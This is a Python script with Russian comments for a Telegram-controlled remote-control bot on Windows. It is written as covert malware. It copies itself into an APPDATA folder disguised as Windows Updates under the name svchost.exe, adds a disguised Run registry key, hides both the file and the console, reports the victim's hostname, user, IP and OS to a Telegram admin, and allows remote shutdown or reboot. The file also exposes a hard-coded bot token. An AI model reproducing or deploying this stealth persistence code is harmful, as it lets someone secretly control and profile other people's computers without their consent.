# -*- coding: utf-8 -*-
import telebot
import os
import sys
import time
import getpass
import platform
import socket
import uuid
import shutil
import subprocess
from threading import Thread

# ========== ТВОИ ДАННЫЕ ==========
BOT_TOKEN = '8689333512:AAE1XY-yWka5xvyN-IIgnH5cy47eB_ug5xU'
ADMIN_ID = 8527578981
# ================================

# Пути для маскировки
HIDDEN_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates')
PROCESS_NAME = "svchost.exe"  # Имя процесса в диспетчере задач

class PCManager:
    def __init__(self):
        self.pc_id = self.get_pc_id()
        self.pc_name = socket.gethostname()
        self.user_name = getpass.getuser()
        
    def get_pc_id(self):
        mac = uuid.getnode()
        return f"PC_{self.get_pc_name()}_{mac % 10000}"
    
    def get_pc_name(self):
        return socket.gethostname()
    
    def get_system_info(self):
        info = {
            'id': self.pc_id,
            'computer': self.pc_name,
            'user': self.user_name,
            'local_ip': socket.gethostbyname(socket.gethostname()),
            'os': platform.system() + ' ' + platform.release(),
            'last_seen': time.strftime('%H:%M %d.%m.%Y')
        }
        return info

pc = PCManager()
bot = telebot.TeleBot(BOT_TOKEN)

def add_to_startup():
    """Добавление в автозагрузку с маскировкой"""
    try:
        # Создаем скрытую папку
        if not os.path.exists(HIDDEN_FOLDER):
            os.makedirs(HIDDEN_FOLDER)
        
        # Копируем себя в скрытую папку
        current_file = os.path.abspath(sys.argv[0])
        hidden_file = os.path.join(HIDDEN_FOLDER, PROCESS_NAME)
        
        if current_file != hidden_file:
            shutil.copy2(current_file, hidden_file)
        
        # Добавляем в реестр (автозагрузка)
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{hidden_file}"')
        
        # Делаем файл скрытым
        subprocess.run(f'attrib +h "{hidden_file}"', shell=True)
        
        # Создаем маркер что уже установлено
        with open(os.path.join(HIDDEN_FOLDER, '.installed'), 'w') as f:
            f.write('installed')
            
        return True
    except Exception as e:
        return False

def send_startup_notification():
    """Отправка уведомления о запуске"""
    time.sleep(5)
    try:
        info = pc.get_system_info()
        message = f"""
🟢 Компьютер в сети
━━━━━━━━━━━━━━━━━━━
🆔 ID: {info['id']}
💻 Имя: {info['computer']}
👤 Пользователь: {info['user']}
🌐 IP: {info['local_ip']}
🖥️ ОС: {info['os']}
⏰ Время: {info['last_seen']}
━━━━━━━━━━━━━━━━━━━
        """
        bot.send_message(ADMIN_ID, message)
    except:
        pass

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещен")
        return
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('🟢 Статус', '🔴 Выключить', '🔄 Перезагрузить')
    
    bot.send_message(
        message.chat.id,
        f"✅ Управление компьютером\n💻 {pc.pc_name}",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.text == '🟢 Статус')
def status(message):
    if message.chat.id == ADMIN_ID:
        info = pc.get_system_info()
        bot.send_message(
            message.chat.id,
            f"🟢 Компьютер в сети\nПоследняя активность: {info['last_seen']}"
        )

@bot.message_handler(func=lambda m: m.text == '🔴 Выключить')
def shutdown(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(message.chat.id, "🔴 Выключение через 10 секунд...")
        time.sleep(2)
        if platform.system() == "Windows":
            os.system("shutdown /s /t 10")
        else:
            os.system("shutdown -h now")

@bot.message_handler(func=lambda m: m.text == '🔄 Перезагрузить')
def restart(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(message.chat.id, "🔄 Перезагрузка через 10 секунд...")
        time.sleep(2)
        if platform.system() == "Windows":
            os.system("shutdown /r /t 10")
        else:
            os.system("shutdown -r now")

def main():
    # Скрываем консоль
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Добавляем в автозагрузку при первом запуске
    marker = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Updates', '.installed')
    if not os.path.exists(marker):
        add_to_startup()
    
    # Отправляем уведомление о запуске
    Thread(target=send_startup_notification).start()
    
    # Запускаем бота
    while True:
        try:
            bot.polling(non_stop=True, interval=0)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()